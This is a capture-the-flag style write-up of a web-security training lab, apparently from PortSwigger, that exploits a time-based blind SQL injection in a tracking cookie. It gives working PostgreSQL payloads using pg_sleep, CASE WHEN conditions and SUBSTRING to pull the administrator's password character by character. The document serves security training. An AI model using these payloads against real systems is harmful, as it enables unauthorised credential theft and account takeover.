
# Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Hint: You can find some useful payloads on our SQL injection cheat sheet.

---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------

It is possible to exploit the SQLI and make the server wait 10 seconds with:

```
COOKIE'||pg_sleep(10)--
```

```
jIPoq0qYcS0Y2AmF'||pg_sleep(10)--
```

We will start with a comparison of 1=1 and 1=2 to see it sleeps only in the first case:

``` 
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

```
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```

Then we will add a check to find the first character of the password:

```
SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END
```

```
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```

It seems it is working. We send it to Intruder:



![img](images/Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/1.png)

And one of the characters take longer to receive the response, in this case “v”:



![img](images/Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/2.png)

Continue character by character nutil getting the password “v06vaymszli7v131izpv”:



![img](images/Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/3.png)